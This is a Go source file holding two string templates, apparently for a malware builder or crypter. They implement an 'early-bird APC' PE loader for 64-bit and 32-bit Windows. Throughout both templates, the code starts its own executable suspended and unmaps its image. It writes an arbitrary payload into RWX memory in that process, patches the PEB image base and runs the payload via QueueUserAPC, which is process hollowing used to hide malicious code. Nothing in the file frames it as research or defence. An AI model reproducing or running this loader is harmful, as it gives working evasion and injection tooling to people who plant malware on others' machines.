package windows

// EarlyBirdRuntime64 contains the amd64 implementation for the early-bird APC loader.
const EarlyBirdRuntime64 = `
func executeEarlyBird(payload []byte) {
	if len(payload) < 0x1000 {
		executeFromTemp(payload)
		return
	}

	if payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}

	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if peOffset > uint32(len(payload)-4) {
		executeFromTemp(payload)
		return
	}

	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}

	optHeaderOffset := peOffset + 24
	imageBase := binary.LittleEndian.Uint64(payload[optHeaderOffset+24:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optHeaderOffset+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optHeaderOffset+60:])
	addressOfEntryPoint := binary.LittleEndian.Uint32(payload[optHeaderOffset+16:])

	exePath, _ := os.Executable()
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	cmdLine := buildCommandLine(exePath, peEmbeddedArgs)
	var cmdPtr *uint16
	if len(cmdLine) > 0 {
		cmdPtr = &cmdLine[0]
	}

	err := createProcess(
		syscall.StringToUTF16Ptr(exePath),
		cmdPtr,
		nil,
		nil,
		false,
		0x4,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		executeFromTemp(payload)
		return
	}

	ctx := make([]byte, 1232)
	binary.LittleEndian.PutUint32(ctx[48:], 0x00100002)

	ret, _, _ := procGetThreadCtx.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if ret == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	Rdx := binary.LittleEndian.Uint64(ctx[136:])

	baseAddrBytes := make([]byte, 8)
	var bytesRead uintptr
	ret, _, _ = procReadProcessMem.Call(
		uintptr(pi.Process),
		uintptr(Rdx+16),
		uintptr(unsafe.Pointer(&baseAddrBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 || bytesRead != 8 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	baseAddr := binary.LittleEndian.Uint64(baseAddrBytes)

	ret, _, _ = procNtUnmapView.Call(uintptr(pi.Process), uintptr(baseAddr))
	if ret != 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	newBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(sizeOfImage),
		0x3000,
		0x40,
	)
	if newBase == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	headerSize := sizeOfHeaders
	if headerSize == 0 || int(headerSize) > len(payload) {
		headerSize = 0x1000
		if len(payload) < 0x1000 {
			headerSize = uint32(len(payload))
		}
	}
	if !writeProcessMemoryChecked(pi.Process, newBase, payload[:headerSize]) {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	optionalSize := binary.LittleEndian.Uint16(payload[peOffset+20:])
	sectionTableOffset := optHeaderOffset + uint32(optionalSize)

	for i := uint16(0); i < numberOfSections; i++ {
		sectionOffset := sectionTableOffset + uint32(i)*40
		if sectionOffset+40 > uint32(len(payload)) {
			break
		}

		virtualAddress := binary.LittleEndian.Uint32(payload[sectionOffset+12:])
		sizeOfRawData := binary.LittleEndian.Uint32(payload[sectionOffset+16:])
		pointerToRawData := binary.LittleEndian.Uint32(payload[sectionOffset+20:])

		if pointerToRawData > 0 && sizeOfRawData > 0 {
			end := pointerToRawData + sizeOfRawData
			if end <= uint32(len(payload)) {
				sectionData := payload[pointerToRawData:end]
				if !writeProcessMemoryChecked(pi.Process, newBase+uintptr(virtualAddress), sectionData) {
					syscall.TerminateProcess(pi.Process, 1)
					executeFromTemp(payload)
					return
				}
			}
		}
	}

	newBaseBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(newBaseBytes, uint64(newBase))
	var bytesWritten uintptr
	ret, _, _ = procWriteProcessMem.Call(
		uintptr(pi.Process),
		uintptr(Rdx+16),
		uintptr(unsafe.Pointer(&newBaseBytes[0])),
		8,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 || bytesWritten != 8 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	entryPoint := uintptr(newBase) + uintptr(addressOfEntryPoint)
	apcRet, _, _ := procQueueUserAPC.Call(entryPoint, uintptr(pi.Thread), 0)
	if apcRet == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	procResumeThread.Call(uintptr(pi.Thread))
}
`

// EarlyBirdRuntime32 contains the 32-bit implementation for the early-bird APC loader.
const EarlyBirdRuntime32 = `
func executeEarlyBird(payload []byte) {
	if len(payload) < 0x200 {
		executeFromTemp(payload)
		return
	}
	if payload[0] != 'M' || payload[1] != 'Z' {
		executeFromTemp(payload)
		return
	}

	peOffset := binary.LittleEndian.Uint32(payload[0x3C:])
	if peOffset > uint32(len(payload)-4) {
		executeFromTemp(payload)
		return
	}
	if string(payload[peOffset:peOffset+4]) != "PE\x00\x00" {
		executeFromTemp(payload)
		return
	}

	machine := binary.LittleEndian.Uint16(payload[peOffset+4:])
	if machine != 0x014c {
		executeFromTemp(payload)
		return
	}

	optHeaderOffset := peOffset + 24
	addressOfEntryPoint := binary.LittleEndian.Uint32(payload[optHeaderOffset+16:])
	imageBase := binary.LittleEndian.Uint32(payload[optHeaderOffset+28:])
	sizeOfImage := binary.LittleEndian.Uint32(payload[optHeaderOffset+56:])
	sizeOfHeaders := binary.LittleEndian.Uint32(payload[optHeaderOffset+60:])

	exePath, _ := os.Executable()
	var si syscall.StartupInfo
	var pi syscall.ProcessInformation
	si.Cb = uint32(unsafe.Sizeof(si))
	cmdLine := buildCommandLine(exePath, peEmbeddedArgs)
	var cmdPtr *uint16
	if len(cmdLine) > 0 {
		cmdPtr = &cmdLine[0]
	}

	err := createProcess(
		syscall.StringToUTF16Ptr(exePath),
		cmdPtr,
		nil,
		nil,
		false,
		0x4,
		nil,
		nil,
		&si,
		&pi,
	)
	if err != nil {
		executeFromTemp(payload)
		return
	}

	ctx := make([]byte, 716)
	binary.LittleEndian.PutUint32(ctx[0:], 0x00010002)

	ret, _, _ := procGetThreadCtx.Call(
		uintptr(pi.Thread),
		uintptr(unsafe.Pointer(&ctx[0])),
	)
	if ret == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	peb := binary.LittleEndian.Uint32(ctx[164:])

	baseBuf := make([]byte, 4)
	var bytesRead uintptr
	ret, _, _ = procReadProcessMem.Call(
		uintptr(pi.Process),
		uintptr(peb+8),
		uintptr(unsafe.Pointer(&baseBuf[0])),
		4,
		uintptr(unsafe.Pointer(&bytesRead)),
	)
	if ret == 0 || bytesRead != 4 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}
	baseAddr := binary.LittleEndian.Uint32(baseBuf)

	ret, _, _ = procNtUnmapView.Call(uintptr(pi.Process), uintptr(baseAddr))
	if ret != 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	newBase, _, _ := procVirtualAllocEx.Call(
		uintptr(pi.Process),
		uintptr(imageBase),
		uintptr(sizeOfImage),
		0x3000,
		0x40,
	)
	if newBase == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	headerSize := sizeOfHeaders
	if headerSize == 0 || int(headerSize) > len(payload) {
		headerSize = 0x1000
		if len(payload) < 0x1000 {
			headerSize = uint32(len(payload))
		}
	}
	if !writeProcessMemoryChecked(pi.Process, newBase, payload[:headerSize]) {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	numberOfSections := binary.LittleEndian.Uint16(payload[peOffset+6:])
	optionalSize := binary.LittleEndian.Uint16(payload[peOffset+20:])
	sectionTableOffset := optHeaderOffset + uint32(optionalSize)

	for i := uint16(0); i < numberOfSections; i++ {
		sectionOffset := sectionTableOffset + uint32(i)*40
		if sectionOffset+40 > uint32(len(payload)) {
			break
		}

		virtualAddress := binary.LittleEndian.Uint32(payload[sectionOffset+12:])
		sizeOfRawData := binary.LittleEndian.Uint32(payload[sectionOffset+16:])
		pointerToRawData := binary.LittleEndian.Uint32(payload[sectionOffset+20:])

		if pointerToRawData > 0 && sizeOfRawData > 0 {
			end := pointerToRawData + sizeOfRawData
			if end <= uint32(len(payload)) {
				sectionData := payload[pointerToRawData:end]
				if !writeProcessMemoryChecked(pi.Process, newBase+uintptr(virtualAddress), sectionData) {
					syscall.TerminateProcess(pi.Process, 1)
					executeFromTemp(payload)
					return
				}
			}
		}
	}

	newBaseBytes := make([]byte, 4)
	binary.LittleEndian.PutUint32(newBaseBytes, uint32(newBase))
	var bytesWritten uintptr
	ret, _, _ = procWriteProcessMem.Call(
		uintptr(pi.Process),
		uintptr(peb+8),
		uintptr(unsafe.Pointer(&newBaseBytes[0])),
		4,
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 || bytesWritten != 4 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	entryPoint := uintptr(newBase) + uintptr(addressOfEntryPoint)
	apcRet, _, _ := procQueueUserAPC.Call(entryPoint, uintptr(pi.Thread), 0)
	if apcRet == 0 {
		syscall.TerminateProcess(pi.Process, 1)
		executeFromTemp(payload)
		return
	}

	procResumeThread.Call(uintptr(pi.Thread))
}
`
